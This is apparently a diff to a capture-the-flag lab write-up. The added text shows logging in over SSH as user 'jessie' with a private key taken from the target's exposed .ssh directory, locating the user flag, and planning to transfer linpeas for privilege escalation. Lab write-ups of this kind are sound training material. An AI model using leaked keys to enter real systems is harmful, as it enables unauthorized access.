@@ -90,8 +90,32 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Tried each and every directory listed above, nothing seems to be working, most of them are not accessible.
 Finally found private key in `.ssh` directory. We already found from the comment inside source code of `apache page`.
+``` bash
+└─# chmod 600 jessie_id_rsa
+└─# ssh -i jessie_id_rsa jessie@$IP
+The authenticity of host '10.10.191.127 (10.10.191.127)' can't be established.
+ECDSA key fingerprint is SHA256:9XK3sKxz9xdPKOayx6kqd2PbTDDfGxj9K9aed2YtF0A.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.191.127' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+8 packages can be updated.
+8 updates are security updates.
+
+jessie@CorpOne:~$ find | grep flag
+./Documents/user_flag.txt
+
+```
+Now you can find root flag easily.
+
 
 2. Root flag.
 ```
 ***
 ```
+Lets transfer linpeas for finding path to privilege escalation. It can be done via secure copy (SCP) or also using a python simple HTTP server. Lets try to use `scp` this time.
